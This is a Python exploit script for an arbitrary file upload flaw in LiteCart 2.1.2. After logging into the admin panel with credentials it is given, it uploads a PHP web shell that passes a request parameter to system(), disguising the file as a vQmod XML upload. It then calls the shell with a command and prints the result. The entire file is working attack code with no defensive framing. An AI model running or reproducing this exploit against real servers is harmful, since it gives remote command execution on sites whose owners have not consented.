import random
import string
import argparse
import requests
import lxml.html
import re
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# LiteCart 2.1.2 Arbitrary File Upload 
class LitecartAFU:
    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}
    def __init__(self, url, username, password):
        print (LogColors.BLUE + "victim url: " + url + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.username, self.password = username, password
        self.session = requests.Session()
        self.session.headers.update(self.headers)

    def login(self):
        print (LogColors.BLUE + "login..." + LogColors.ENDC)
        r = self.session.get(self.url + "/admin/login.php", verify = False)
        tree = lxml.html.fromstring(r.text)
        form = tree.xpath('.//form[@name="login_form"]')[0]
        
        token = form.xpath('.//input[@name="token"]/@value')
        token = token[0]

        login_val = form.xpath('.//input[@name="login"]/@value')
        login_val = login_val[0]

        data = {
            'username' : self.username,
            'password' : self.password,
            'token' : token,
            'login' : login_val,
            'redirect_url' : '/shop/admin',
        }
        print (LogColors.YELLOW + self.username + ":" + self.password + "..." + LogColors.ENDC)
        try:
            r = self.session.post(self.url + "/admin/login.php", data = data, verify = False)
            if r.ok and "You are now logged in as" in r.text:
                print (LogColors.GREEN + "successfully login :)..." + LogColors.ENDC)
            else:
                print (LogColors.RED + "login failed :(" + LogColors.ENDC)
                sys.exit()
        except Exception as e:
            print (LogColors.RED + str(e) + LogColors.ENDC)

    def exploit(self, cmd):
        print (LogColors.BLUE + "exploiting..." + LogColors.ENDC)
        r = self.session.get(self.url + "/admin/?app=vqmods&doc=vqmods", verify = False)
        tree = lxml.html.fromstring(r.text)
        form = tree.xpath('.//form[@name="vqmods_form"]')[0]
        
        token = form.xpath('.//input[@name="token"]/@value')
        token = token[0]

        filename = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
        files = {
            'vqmod' : (filename + ".php", "<?php if( isset( $_REQUEST['cmd'] ) ) { system( $_REQUEST['cmd'] . ' 2>&1' ); } ?>", "application/xml"),
            'token' : token,
            'upload' : (None, "Upload")
        }

        try:
            r = self.session.post(self.url + "/admin/?app=vqmods&doc=vqmods", files = files,
                    verify = False)
            if r.ok:
                print (LogColors.GREEN + "successfully upload shell" + LogColors.ENDC)
            else:
                print (LogColors.RED + "failed upload shell" + LogColors.ENDC)
                sys.exit()

        except Exception as e:
            print (LogColors.RED + "failed upload shell...: " + str(e) + LogColors.ENDC)
            sys.exit()

        try:
            shell_url = self.url + "/../vqmod/xml/" + filename + ".php?cmd=" + cmd
            r = self.session.get(shell_url, verify = False)
            if r.ok:
                print (LogColors.YELLOW + "shell: " + shell_url + LogColors.ENDC)
                print (r.text)
                print (LogColors.GREEN + "hacked :)" + LogColors.ENDC)
            else:
                print (LogColors.RED + "failed exploitation" + LogColors.ENDC)
                sys.exit()

        except Exception as e:
            print (LogColors.RED + "failed exploitation...: " + str(e) + LogColors.ENDC)
            sys.exit()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target url")
    parser.add_argument('-u', '--username', required = True, help = "username")
    parser.add_argument('-p', '--password', required = True, help = "password")
    args = vars(parser.parse_args())
    cve = LitecartAFU(args['target'], args['username'], args['password'])
    cve.login()
    cve.exploit("whoami")

